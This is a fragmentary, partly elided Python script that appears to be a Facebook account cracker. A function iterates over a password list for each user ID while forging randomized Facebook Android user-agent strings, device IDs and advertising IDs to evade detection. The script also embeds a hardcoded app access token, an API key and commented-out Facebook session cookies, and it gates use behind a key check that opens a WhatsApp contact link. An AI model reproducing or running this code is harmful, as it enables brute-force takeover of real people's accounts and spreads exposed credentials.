    ...
    def check():
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                os.system( 'xdg-open https://wa.me/+9779817821280')
        except Exception as e:
            print(e)
            exit()
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    # 'cookie': 'datr=Gwm3ZeHBMXx9pkl4CS8v6vO2; sb=Gwm3ZTqu_rcAbImNe4MslOX-; locale=en_GB; vpd=v1%3B669x360x1.8391053676605225; ps_n=0; ps_l=0; oo=v1; m_pixel_ratio=1.8391053676605225; wd=391x727; fr=0RJ1zE743u1Gw4GiD..BluNUI.wT.AAA.0.0.BluNUM.AWUE2Jg3Gvw',
    'dpr': '2',
...
def api2(uid,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/309.0.0.47.119;[FBAN/FB4A;FBAVFBBV/277444756aa;FBDM/{density=3'+'.0,width='+'1080,height='+'1920};FBLC/hi_ID;FBRV/279865282;FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-C900Y;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
    ...
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=Gwm3ZeHBMXx9pkl4CS8v6vO2; sb=Gwm3ZTqu_rcAbImNe4MslOX-; locale=en_GB; vpd=v1%3B669x360x1.8391053676605225; ps_n=0; ps_l=0; m_pixel_ratio=1.8391053676605225; oo=v1; wd=391x727; fr=01hZyQY3B1tj9FUWp..Blu7r7.wT.AAA.0.0.Blu7r-.AWX_qhRazl0',
    'dpr': '2',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
